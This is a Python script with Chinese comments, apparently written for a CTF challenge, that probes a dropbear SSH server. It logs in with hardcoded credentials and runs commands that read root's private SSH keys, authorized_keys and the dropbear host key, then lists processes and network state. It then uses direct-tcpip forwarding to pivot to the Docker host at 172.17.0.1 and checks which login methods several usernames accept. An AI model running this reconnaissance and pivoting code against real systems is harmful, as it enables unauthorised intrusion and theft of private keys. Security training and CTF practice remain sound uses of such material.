#!/usr/bin/env python3
"""
探索dropbear FakeJumpServer行为
关键：当direct-tcpip请求localhost时，dropbear会创建新的SSH会话来"fake"跳转
"""
import paramiko
import socket
import time
import traceback

HOST = '61.147.171.105'
PORT = 55300
USERNAME = 'ctf'
PASSWORD = '123456'

def test_direct_tcpip_target(target_host, target_port=22):
    """通过 direct-tcpip 连接目标并读取 banner"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, PORT, USERNAME, PASSWORD, timeout=10)
        
        transport = client.get_transport()
        
        # 请求 direct-tcpip
        channel = transport.open_channel(
            "direct-tcpip",
            (target_host, target_port),
            ("127.0.0.1", 0),
            timeout=5
        )
        
        # 等待并读取 banner
        channel.settimeout(5)
        time.sleep(0.5)
        data = b""
        try:
            while True:
                chunk = channel.recv(1024)
                if not chunk:
                    break
                data += chunk
                if b"\n" in data:
                    break
        except:
            pass
        
        channel.close()
        client.close()
        return f"SUCCESS: {data.decode('utf-8', errors='replace').strip()}"
    except Exception as e:
        return f"ERROR: {e}"

def explore_root():
    """探索容器中的root目录"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, PORT, USERNAME, PASSWORD, timeout=10)
        
        commands = [
            "ls -la /root/",
            "ls -la /root/.ssh/ 2>/dev/null",
            "cat /root/.ssh/authorized_keys 2>/dev/null",
            "cat /root/.ssh/id_rsa 2>/dev/null",
            "cat /root/.ssh/id_ed25519 2>/dev/null",
            "cat /etc/dropbear/dropbear_rsa_host_key 2>/dev/null | xxd | head -5",
            "ls -la /etc/dropbear/ 2>/dev/null",
            # 查看容器的只读挂载
            "mount | grep -E '(readonly|ro,)'",
            # 查看进程
            "ps aux",
            # 查看网络
            "ip addr 2>/dev/null || ifconfig -a",
            "cat /proc/net/tcp",
            "cat /etc/resolv.conf",
        ]
        
        for cmd in commands:
            print(f"\n=== {cmd} ===")
            stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
            output = stdout.read().decode('utf-8', errors='replace')
            error = stderr.read().decode('utf-8', errors='replace')
            if output:
                print(output[:1000])
            if error:
                print(f"STDERR: {error[:300]}")
        
        client.close()
    except Exception as e:
        print(f"Error: {e}")
        traceback.print_exc()

def test_ssh_to_realhost():
    """尝试通过direct-tcpip连接到真实主机并进行SSH认证"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, PORT, USERNAME, PASSWORD, timeout=10)
        
        transport = client.get_transport()
        
        # 打开到172.17.0.1的channel
        channel = transport.open_channel(
            "direct-tcpip",
            ("172.17.0.1", 22),
            ("127.0.0.1", 0),
            timeout=10
        )
        
        # 使用这个channel创建新的SSH连接
        inner_transport = paramiko.Transport(channel)
        inner_transport.connect()
        
        # 列出支持的认证方式
        try:
            inner_transport.auth_none("root")
        except paramiko.BadAuthenticationType as e:
            print(f"Auth types for root: {e.allowed_types}")
        
        # 尝试ctf用户
        try:
            inner_transport.auth_none("ctf")
        except paramiko.BadAuthenticationType as e:
            print(f"Auth types for ctf: {e.allowed_types}")
        
        # 列出更多用户
        for user in ["ubuntu", "admin", "user", "test", "flag"]:
            try:
                inner_transport.auth_none(user)
            except paramiko.BadAuthenticationType as e:
                print(f"Auth types for {user}: {e.allowed_types}")
            except Exception as e:
                print(f"Error for {user}: {e}")
        
        inner_transport.close()
        channel.close()
        client.close()
    except Exception as e:
        print(f"Error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    print("=== Exploring container ===")
    explore_root()
    
    print("\n=== Testing SSH to real host 172.17.0.1 ===")
    test_ssh_to_realhost()
